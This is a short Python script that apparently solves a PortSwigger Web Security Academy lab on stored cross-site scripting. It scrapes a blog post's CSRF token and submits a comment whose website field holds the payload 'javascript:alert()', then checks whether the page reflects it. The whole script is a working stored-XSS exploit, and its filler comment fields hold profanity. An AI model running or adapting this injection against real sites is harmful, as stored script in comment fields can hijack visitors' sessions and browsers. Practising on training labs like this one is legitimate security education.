import requests
from bs4 import BeautifulSoup

session = requests.Session()
payload = "javascript:alert()"
url = "https://0aa60079046ee670822d83ff00f000fa.web-security-academy.net/"

respose = session.get(url + "post?postId=6")
html = respose.text
soup = BeautifulSoup(html, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf,
    "postId": "6",
    "comment": "shit",
    "name": "reda",
    "email": "ex@fuck.com",
    "website": payload,
}
respose = session.post(url + "post/comment", data=data)
print(respose.status_code)
respose = session.get(url + "post?postId=6")
if payload in respose.text:
    print("pk")
else:
    print("oh")
